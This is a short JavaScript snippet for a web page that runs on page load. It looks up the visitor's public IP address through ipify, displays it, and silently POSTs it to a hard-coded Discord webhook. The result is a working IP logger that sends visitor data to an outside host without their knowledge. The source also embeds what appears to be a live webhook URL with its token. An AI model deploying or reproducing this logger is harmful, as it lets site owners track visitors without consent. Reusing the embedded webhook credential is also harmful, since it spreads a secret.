async function getIP() {
    // Replace this with your actual Discord webhook URL
    const webhookUrl = "https://discord.com/api/webhooks/1525992971105734806/6lxCHe7Ir5ah3PgNjUyPFg10hv5I66w3adebTIQVVZhAV0To95cXw44Bwt8USlM2EsDa";

    try {
        const response = await fetch('https://api.ipify.org?format=json');

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const data = await response.json();

        // 1. Display the IP on your webpage
        document.getElementById('ip-display').textContent = data.ip;

        // 2. Prepare the data for Discord using the retrieved IP
        const webhookData = {
            content: `User IP Address: ${data.ip}`
        };

        // 3. Send the POST request to Discord
        const discordResponse = await fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(webhookData)
        });

        if (discordResponse.ok) {
            console.log("IP successfully sent to Discord!");
        } else {
            console.error("Discord error:", discordResponse.statusText);
        }

    } catch (error) {
        document.getElementById('ip-display').textContent = "Error retrieving IP";
        console.error('Error:', error);
    }
}

// Call the function
getIP();
